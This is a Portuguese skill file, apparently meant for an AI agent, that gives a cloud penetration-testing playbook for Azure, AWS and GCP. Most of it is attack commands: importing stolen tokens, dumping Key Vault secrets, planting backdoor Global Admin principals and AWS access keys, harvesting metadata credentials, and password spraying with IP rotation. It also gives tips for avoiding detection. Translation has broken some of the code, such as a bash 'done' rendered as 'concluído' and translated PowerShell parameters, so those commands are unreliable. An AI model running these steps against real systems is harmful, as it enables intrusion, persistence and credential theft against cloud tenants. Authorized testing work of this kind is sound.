--- 
name: teste-de-penetração-na-nuvem
description: "Realize avaliações de segurança abrangentes da infraestrutura em nuvem no Microsoft Azure, Amazon Web Services (AWS) e Google Cloud Platform (GCP)."
risk: ofensivo
source: comunidade
autor: zebbern
date_add: "27/02/2026"
---

> USO AUTORIZADO APENAS: Use esta habilidade somente para avaliações de segurança autorizadas, validação defensiva ou ambientes educacionais controlados.

<!-- security-allowlist: curl-pipe-bash -->

# Teste de Penetração na Nuvem

## Objetivo

Realizar avaliações de segurança abrangentes da infraestrutura em nuvem no Microsoft Azure, Amazon Web Services (AWS) e Google Cloud Platform (GCP). Esta habilidade abrange técnicas de reconhecimento, teste de autenticação, enumeração de recursos, escalonamento de privilégios, extração de dados e persistência para engajamentos de segurança em nuvem autorizados.

## Pré-requisitos

### Ferramentas Necessárias
```bash
# Ferramentas do Azure
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud init

# Ferramentas adicionais
pip install scoutsuite pacu
```

### Conhecimento necessário
- Fundamentos de arquitetura em nuvem
- Gerenciamento de Identidade e Acesso (IAM)
- Mecanismos de autenticação de API
- Conceitos de DevOps e automação

### Acesso necessário
- Autorização por escrito para testes
- Credenciais de teste ou tokens de acesso
- Escopo e regras de engajamento definidos

## Resultados e entregáveis

1. **Relatório de Avaliação de Segurança na Nuvem** - Resultados abrangentes e classificações de risco
2. **Inventário de Recursos** - Serviços, armazenamento e instâncias de computação enumerados
3. **Resultados de Credenciais** - Segredos, chaves e configurações incorretas expostas
4. **Recomendações de Remediação** - Orientações de reforço de segurança por plataforma

## Fluxo de trabalho principal

### Fase 1: Reconhecimento

Coletar informações iniciais sobre a presença na nuvem alvo:

```bash
# Azure: Obter informações de federação
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure: Obter ID do locatário
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# Enumerar recursos de nuvem por nome da empresa
python3 cloud_enum.py -k targetcompany

# Verificar IP em relação aos provedores de nuvem
cat ips.txt | python3 ip2provider.py
```

### Fase 2: Autenticação do Azure

Autenticar em ambientes do Azure:

```powershell
# Módulo Az do PowerShell
Import-Module Az
Connect-AzAccount

# Com credenciais (pode ignorar a MFA)
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# Importar contexto roubado
Import-AzContext -Profile 'C:\Temp\StolenToken.json'

# Exportar contexto para persistência
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# Módulo MSOnline
Import-Module MSOnline
Connect-MsolService
```

### Fase 3: Enumeração do Azure

Descobrir recursos e permissões do Azure:

```powershell
# Listar contextos e assinaturas
Get-AzContext -ListAvailable
Get-AzSubscription

# Atribuições de função do usuário atual
Get-AzRoleAssignment

# Listar recursos
Get-AzResource
Get-AzResourceGroup

# Contas de armazenamento
Get-AzStorageAccount

# Aplicativos Web
Get-AzWebApp

# Servidores e bancos de dados SQL
Get-AzSQLServer
Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG

# Máquinas virtuais
Get-AzVM
$vm = Get-AzVM -Name "VMName"
$vm.OSProfile

# Listar todos os usuários
Get-MSolUser -All

# Listar todos os grupos
Get-MSolGroup -All

# Administradores globais
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember -GroupObjectId $GUID

# Entidades de serviço
Get-MsolServicePrincipal
```

### Fase 4: Exploração do Azure

Explorar configurações incorretas do Azure:

```powershell
# Buscar senhas nos atributos do usuário
$users = Get-MsolUser -All
foreach($user in $users){

$props = @()

$user | Get-Member | foreach-object{$props+=$_.Name}

foreach($prop in $props){

if($user.$prop -like "*senha*"){

Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)

}
}
}

# Executar comandos em VMs
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# Extrair dados do usuário da VM
$vms = Get-AzVM
$vms.UserData

# Despejar segredos do Key Vault
az keyvault list --query '[].name' --output tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>
```

### Fase 5: Persistência no Azure

Estabelecer persistência no Azure:

```powershell
# Criar principal de serviço de backdoor
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Proprietário da Função
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Adicionar entidade de serviço ao Administrador Global
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Administrador da Empresa"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Fazer login como entidade de serviço
$cred = Get-Credential # AppID como nome de usuário, segredo como senha
Connect-AzAccount -Credential $cred -Tenant "id-do-locatário" -ServicePrincipal

# Criar novo usuário administrador via CLI
az ad user create --display-name <nome> --password <senha> --user-principal-name <upn>
```

### Fase 6: Autenticação AWS

Autenticar em ambientes AWS:

```bash
# Configurar a AWS CLI
aws configure
# Insira: ID da chave de acesso, chave de acesso secreta, região, formato de saída

# Usar um perfil específico
aws configure --profile target

# Testar credenciais
aws sts get-caller-identity
```

### Fase 7: Enumeração AWS

Descobrir recursos da AWS:

```bash
# Informações da conta
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# Buckets S3
aws s3 ls
aws s3 ls s3://nome-do-bucket/
aws s3 sync s3://nome-do-bucket ./diretório-local

# EC2 Instâncias
aws ec2 describe-instances

# Bancos de dados RDS
aws rds describe-db-instances --region us-east-1

# Funções Lambda
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name <nome>

# Clusters EKS
aws eks list-clusters --region us-east-1

# Redes
aws ec2 describe-subnets
aws ec2 describe-security-groups --group-ids <id-do-grupo-de-segurança>
aws directconnect describe-connections
```

### Fase 8: Exploração da AWS

Explorar configurações incorretas da AWS:

```bash
# Verificar snapshots públicos do RDS
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues ​​= "all" significa publicamente acessível

# Extrair variáveis ​​de ambiente do Lambda (podem conter segredos)
aws lambda get-function --function-name <nome> | jq '.Configuration.Environment'

# Acessar o serviço de metadados (de uma instância EC2 comprometida)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Acesso ao IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Fase 9: Persistência na AWS

Estabelecer persistência em AWS:

```bash
# Listar chaves de acesso existentes
aws iam list-access-keys --user-name <nome de usuário>

# Criar chave de acesso backdoor
aws iam create-access-key --user-name <nome de usuário>

# Obter todos os IPs públicos do EC2
for region in $(cat regions.txt); do

aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
concluído
```

### Fase 10: Enumeração do GCP

Descobrir recursos do GCP:

```bash
# Autenticação
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list

# Informações da conta
gcloud config list
gcloud organizations list
gcloud projects list

# Políticas do IAM
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>

# Serviços habilitados
gcloud services list

# Repositórios de código-fonte
gcloud source repos list
gcloud source repos clone <repo>

# Instâncias de computação
gcloud compute instances list
gcloud beta compute ssh --zone "region" "instance" --project "project"

# Buckets de armazenamento
gsutil ls
gsutil ls -r gs://nome-do-bucket
gsutil cp gs://bucket/arquivo ./local

# Instâncias SQL
gcloud sql instances list
gcloud sql databases list --instance <id>

# Kubernetes
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>
kubectl cluster-info
```

### Fase 11: Exploração do GCP

Explorar configurações incorretas do GCP:

```bash
# Obter dados do serviço de metadados
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# Verificar escopos de acesso
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Descriptografar dados com keyring
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <chave> --keyring <keyring> --location global

# Análise de funções serverless
gcloud functions list
gcloud functions describe <nome>
gcloud functions logs read <nome> --limit 100

# Encontrar credenciais armazenadas
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config
gcloud auth list
```

## Referência Rápida

### Comandos de Tecla do Azure

| Ação | Comando |

|--------|---------|

| Login | `Connect-AzAccount` |

| Listar assinaturas | `Get-AzSubscription` |

| Listar usuários | `Get-MsolUser -All` |

| Listar grupos | `Get-MsolGroup -All` |

| Funções atuais | `Get-AzRoleAssignment` |

| Listar VMs | `Get-AzVM` |

| Listar armazenamento | `Get-AzStorageAccount` |

| Segredos do Key Vault | `az keyvault secret list --vault-name <nome>` |

### Comandos de Tecla da AWS

| Ação | Comando |

|--------|---------|
| Configurar | `aws configure` |

| Identidade do chamador | `aws sts get-caller-identity` |

| Listar usuários | `aws iam list-users` |

| Listar buckets do S3 | `aws s3 ls` |

| Listar instâncias do EC2 | `aws ec2 describe-instances` |

| Listar funções Lambda | `aws lambda list-functions` |

| Metadados | `curl http://169.254.169.254/latest/meta-data/` |

### Comandos de tecla do GCP

| Ação | Comando |

|--------|---------|

| Login | `gcloud auth login` |

| Listar projetos | `gcloud projects list` |

| Listar instâncias | `gcloud compute instances list` |

| Listar buckets | `gsutil ls` |

| Listar clusters | `gcloud container clusters list` |

| Política do IAM | `gcloud projects get-iam-policy <projeto>` |

| Metadados | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### URLs do Serviço de Metadados

| Provedor | URL |

|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |

| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |

| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### Ferramentas Úteis

| Ferramenta | Finalidade |

|------|---------|

| ScoutSuite | Auditoria de segurança em múltiplas nuvens |

Pacu | Framework de exploração da AWS |

AzureHound | Mapeamento de caminhos de ataque no Azure AD |

ROADTools | Enumeração do Azure AD |

WeirdAAL | Enumeração de serviços da AWS |

MicroBurst | Avaliação de segurança do Azure |

PowerZure | Pós-exploração do Azure |

## Restrições e Limitações

### Requisitos Legais
- Teste somente com autorização escrita explícita
- Respeite os limites de escopo entre contas na nuvem
- Não acesse dados de produção de clientes
- Documente todas as atividades de teste

### Limitações Técnicas
- A autenticação multifator (MFA) pode impedir ataques baseados em credenciais
- Políticas de Acesso Condicional podem restringir o acesso
- Os logs do CloudTrail/Activity registram todas as chamadas de API
- Alguns recursos exigem acesso regional específico

### Considerações sobre Detecção
- Os provedores de nuvem registram toda a atividade da API
- Padrões de acesso incomuns acionam alertas
- Use enumeração lenta e deliberada
- Considere o GuardDuty, o Security Center e o Cloud Armor

## Exemplos

### Exemplo 1: Azure Password Spray

**Cenário:** Testar a política de senhas do Azure AD

```powershell
# Usando MSOLSpray com FireProx para rotação de IP
# Primeiro, crie um endpoint do FireProx
python fire.py --access_key <chave> --secret_access_key <segredo> --region us-east-1 --url https://login.microsoft.com --comando create

# Gerar senhas
Import-Module .\MSOLspray.ps1
Invoke-MSOLspray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Exemplo 2: Enumeração de Buckets do AWS S3

**Cenário:** Encontrar e acessar buckets do S3 mal configurados

```bash
# Listar todos os buckets
aws s3 ls | awk '{print $3}' > buckets.txt

# Verificar o conteúdo de cada bucket
while read bucket; do

echo "Verificando: $bucket"

aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# Baixar bucket interessante
aws s3 sync s3://misconfigured-bucket ./loot/
```

### Exemplo 3: Comprometimento de conta de serviço do GCP

**Cenário:** Pivotar usando conta de serviço comprometida

```bash
# Autenticar com a chave da conta de serviço
gcloud auth activate-service-account --key-file committed-sa.json

# Listar projetos acessíveis
gcloud projects list

# Enumerar instâncias de computação
gcloud compute instances list --project target-project

# Verificar chaves SSH nos metadados
gcloud compute project-info describe --project target-project | grep ssh

# SSH para a instância
gcloud beta compute ssh nome-da-instância --zone us-central1-a --project projeto-alvo
```

## Solução de Problemas

| Problema | Soluções |

|-------|-----------|

| Falhas de autenticação | Verificar credenciais; verificar MFA; garantir que o locatário/projeto esteja correto; tentar métodos de autenticação alternativos |

| Permissão negada | Listar funções atuais; tentar recursos diferentes; verificar políticas de recursos; verificar região |

| Serviço de metadados bloqueado | Verificar IMDSv2 (AWS); verificar função da instância; verificar firewall para 169.254.169.254 |

| Limitação de taxa | Adicionar atrasos; distribuir entre regiões; usar várias credenciais; focar em alvos de alto valor |

## Referências

- [Scripts Avançados na Nuvem](referencias/scripts-avançados-em-nuvem.md) - Runbooks do Azure Automation, enumeração do Function Apps, exfiltração de dados da AWS, exploração avançada do GCP

## Quando usar
Esta habilidade é aplicável para executar o fluxo de trabalho ou as ações descritas na visão geral.